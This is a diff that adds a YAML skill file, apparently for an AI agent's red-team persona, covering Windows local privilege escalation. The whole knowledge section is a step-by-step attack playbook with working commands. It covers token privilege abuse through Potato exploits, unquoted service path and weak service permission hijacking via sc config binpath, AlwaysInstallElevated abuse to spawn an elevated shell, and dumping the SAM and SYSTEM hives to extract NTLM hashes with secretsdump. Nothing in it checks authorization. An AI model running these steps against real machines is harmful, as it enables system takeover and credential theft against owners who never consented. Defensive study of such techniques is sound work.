@@ -1,0 +1,63 @@
+schema_version: 1
+version: 3.0.0
+name: windows-privesc
+description: Senior Windows host privilege escalation — service misconfigurations, unquoted service paths, AlwaysInstallElevated, Token Impersonation (SeImpersonate), and SAM/SYSTEM credential extraction.
+triggers:
+  - windows privesc
+  - windows escalation
+  - unquoted service path
+  - alwaysinstallelevated
+  - seimpersonate
+  - potato
+  - sweetpotato
+  - godpotato
+  - sam dump
+  - dpapi
+tools:
+  - netexec
+knowledge: |
+  Perform Windows local privilege escalation analysis with senior red-team precision and zero guesswork.
+
+  1. IDENTITY & PRIVILEGE ENUMERATION:
+     - Inspect current token context, group memberships, and assigned privileges:
+       `whoami /all`
+     - Critical High-Value Privileges:
+       • `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`:
+         Enables instant escalation to `NT AUTHORITY\SYSTEM` via DCOM/RPC named pipe interception (the Potato exploit family, e.g. GodPotato / SweetPotato).
+       • `SeBackupPrivilege` / `SeRestorePrivilege`:
+         Allows reading any file on the system (including SAM/SYSTEM registry hives) bypassing DACLs.
+
+  2. UNQUOTED SERVICE PATHS:
+     When a Windows service path contains spaces and lacks enclosing quotation marks (e.g. `C:\Program Files\Sub Dir\service.exe`):
+     - The service manager resolves execution attempts hierarchically:
+       `C:\Program.exe` -> `C:\Program Files\Sub.exe` -> `C:\Program Files\Sub Dir\service.exe`
+     - Discovery Query:
+       `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`
+     - If an unprivileged user possesses write permissions in an intermediate directory, placing an executable achieves elevated persistence or execution.
+
+  3. WEAK SERVICE PERMISSIONS:
+     - Inspect service configuration permissions:
+       `sc qc <service_name>`
+     - If an unprivileged user has `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`:
+       Modify binary path to execute arbitrary commands upon service start:
+       `sc config <service_name> binpath= "cmd.exe /c <command>"`
+       `sc stop <service_name>` && `sc start <service_name>`
+
+  4. ALWAYSINSTALLELEVATED REGISTRY VULNERABILITY:
+     - Check if system allows unprivileged users to execute MSI installation packages with elevated NT AUTHORITY\SYSTEM rights:
+       `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+       `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+     - If BOTH registry keys evaluate to `0x1`, craft or execute a standard MSI package to spawn an elevated shell.
+
+  5. SAM & SYSTEM REGISTRY HIVE HARVESTING:
+     - When elevated backup rights exist:
+       Dump registry hives containing local NTLM password hashes:
+       `reg save HKLM\SAM sam.save`
+       `reg save HKLM\SYSTEM system.save`
+     - Extract local Administrator hashes offline:
+       `secretsdump.py -sam sam.save -system system.save LOCAL`
+references:
+  - persona:windows-privesc-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/windows-privesc.yaml
